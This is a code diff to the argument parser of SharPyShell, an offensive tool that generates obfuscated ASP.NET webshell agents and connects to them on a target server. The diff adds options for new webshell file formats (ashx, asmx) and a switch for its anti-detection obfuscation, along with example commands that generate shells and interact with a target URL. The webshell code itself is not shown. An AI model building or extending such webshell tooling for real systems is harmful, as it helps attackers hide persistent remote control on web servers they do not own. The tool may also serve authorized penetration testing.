@@ -9,14 +9,17 @@ import argparse
 example_text_main = '''
 examples:
     python SharPyShell.py generate -p 'somepassword'
+    python SharPyShell.py generate -p 'somepassword' -f ashx -o raw -e aes256
+    python SharPyShell.py generate -p 'somepassword' -f asmx --no-obfuscate
     python SharPyShell.py interact -u 'http://target.url/sharpyshell.aspx' -p 'somepassword'
+    python SharPyShell.py interact -u 'http://target.url/handler.ashx' -p 'somepassword'
 '''
 
 
 def create_generate_parser(subparsers):
     generate_parser = subparsers.add_parser(
         'generate', formatter_class=argparse.RawTextHelpFormatter,
-        usage='SharPyShell.py generate -p password -e encryption -o obfuscator [--output] [--endian-type]',
+        usage='SharPyShell.py generate -p password -e encryption -o obfuscator [-f format] [--no-obfuscate] [--output] [--endian-type]',
         help='Generate the obfuscated webshell agent',
     )
     generate_parser._action_groups.pop()
@@ -53,6 +56,26 @@ def create_generate_parser(subparsers):
         '--output',
         help='\tThe output path where to generate the webshell agent',
         metavar='\b'
+    )
+    optional_generate_parser.add_argument(
+        '-f',
+        '--format',
+        help='\tThe file format/extension for the webshell agent'
+             '\nAllowed values: \'aspx\', \'ashx\', \'asmx\''
+             '\n  aspx: ASP.NET Web Form (default)'
+             '\n  ashx: Generic HTTP Handler'
+             '\n  asmx: Web Service'
+             '\nDefault \'aspx\'',
+        choices=['aspx', 'ashx', 'asmx'],
+        default='aspx',
+        metavar='\b'
+    )
+    optional_generate_parser.add_argument(
+        '--no-obfuscate',
+        help='\tDisable post-processing obfuscation'
+             '\n(identifier randomization, string encoding, junk code, decoy comments)',
+        action='store_true',
+        default=False,
     )
     optional_generate_parser.add_argument(
         '--endian-type',
@@ -155,7 +178,12 @@ if __name__ == '__main__':
 
     if args.__contains__('mode'):
         if args.mode == 'generate':
-            generate_obj = Generate(args.password, args.encryption, args.obfuscator, args.endian_type, args.output)
+            generate_obj = Generate(
+                args.password, args.encryption, args.obfuscator,
+                args.endian_type, args.output,
+                file_format=args.format,
+                obfuscate=not args.no_obfuscate,
+            )
             generate_obj.generate()
 
         if args.mode == 'interact':
